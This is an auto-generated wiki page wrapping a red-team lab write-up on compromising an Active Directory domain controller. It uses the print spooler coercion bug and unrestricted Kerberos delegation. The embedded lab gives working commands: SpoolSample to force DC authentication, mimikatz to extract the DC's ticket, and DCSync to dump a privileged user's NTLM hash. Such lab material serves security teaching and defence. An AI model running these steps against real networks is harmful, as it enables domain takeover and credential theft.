---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Domain Compromise via DC Print Server and Kerberos Delegation

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-experiments-active-directory-kerberos-abuse-domain-compromise-via-dc-print-server-and-kerberos-delegation` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Domain Compromise via DC Print Server and Kerberos Delegation](../../topics/offensive-security-experiments/domain-compromise-via-dc-print-server-and-kerberos-delegation.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-experiments-active-directory-kerberos-abuse-domain-compromise-via-dc-print-server-and-kerberos-delegation |
| name | Domain Compromise via DC Print Server and Kerberos Delegation |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation.md |

## Preserved Source Material

````yaml
_asset_filenames:
- Screenshot from 2018-10-31 23-32-34.png
- Screenshot from 2018-10-31 23-33-49.png
- Screenshot from 2018-10-31 23-43-32.png
- image (503).png
- image (504).png
_body: "# Domain Compromise via DC Print Server and Kerberos Delegation\n\nThis lab demonstrates an attack on Active Directory\
  \ Domain Controller (or any other host to be fair) that involves the following steps and environmental conditions:\n\n*\
  \ Attacker has to compromise a system that has an unrestricted kerberos delegation enabled.\n* Attacker finds a victim that\
  \ runs a print server. In this lab this happened to be a Domain Controller.\n* Attacker coerces the DC to attempt authenticating\
  \ to the attacker controlled host which has unrestricted kerberos delegation enabled.&#x20;\n  * This is done via RPC API\
  \  [`RpcRemoteFindFirstPrinterChangeNotificationEx`](https://msdn.microsoft.com/en-us/library/cc244813.aspx) that allows\
  \ print clients to subscribe to notifications of changes on the print server.\n  * Once the API is called, the DC attempts\
  \ to authenticate to the compromised host by revealing its TGT to the attacker controlled compromised system.\n* Attacker\
  \ extracts `DC01's` TGT from the compromised system and impersonates the DC to carry a DCSync attack and dump domain member\
  \ hashes.\n\nThis lab builds on [Domain Compromise via Unrestricted Kerberos Delegation](domain-compromise-via-unrestricted-kerberos-delegation.md)\n\
  \n## Execution\n\nOur environment for this lab is:\n\n* ws01 - attacker compromised host with kerberos delegation enabled\
  \ (attacker, server)\n* dc01 - domain controller running a print service (victim, target)\n\nWe can check if a spool service\
  \ is running on a remote host like so:\n\n```\nls \\\\dc01\\pipe\\spoolss\n```\n\n![](<../../.gitbook/assets/image (503).png>)\n\
  \nIf the spoolss was not running, we would receive an error.\n\nAnother way to check if the spoolss is running on a remote\
  \ machine is:\n\n![](<../../.gitbook/assets/image (504).png>)\n\nNow, after compiling the amazing PoC [SpoolSample](https://github.com/leechristensen/SpoolSample)\
  \ by [@tifkin\\_](https://twitter.com/tifkin\\_), we execute it with two arguments `target` and `server` (DC with spoolss\
  \ running on it):\n\n```csharp\n.\\SpoolSample.exe dc01 ws01\n```\n\n![](<../../.gitbook/assets/Screenshot from 2018-10-31\
  \ 23-32-34.png>)\n\nWe are shown a message that the target attemped authenticating to our compromised system, so let's check\
  \ if we can retrieve DC01 TGT:\n\n```csharp\nmimikatz # sekurlsa::tickets\n```\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2018-10-31 23-33-49.png>)\n\nWe indeed got a TGT for DC01$ computer!\n\nWith this, we can make our compromised system\
  \ `ws01$` appear like a Domain Controller and extract an NTLM hash for the user `offense\\spotless` which we know has high\
  \ privileges in the domain:\n\n```csharp\nmimikatz # lsadump::dcsync /domain:offense.local /user:spotless\n```\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2018-10-31 23-43-32.png>)\n\nThe above clearly shows the attack was successful and an NTLM hash for the user spotless\
  \ got retrieved -  get cracking or passing it now.\n\n## Mitigation\n\nFor mitigations, see [Domain Compromise via Unrestricted\
  \ Kerberos Delegation](domain-compromise-via-unrestricted-kerberos-delegation.md#mitigation) mitigations section.\n\n##\
  \ References\n\n{% embed url=\"https://github.com/leechristensen/SpoolSample\" %}\n\n{% embed url=\"https://adsecurity.org/?p=4056\"\
  \ %}\n\n{% embed url=\"https://adsecurity.org/?p=2053\" %}"
_relative_path: offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation.md
````
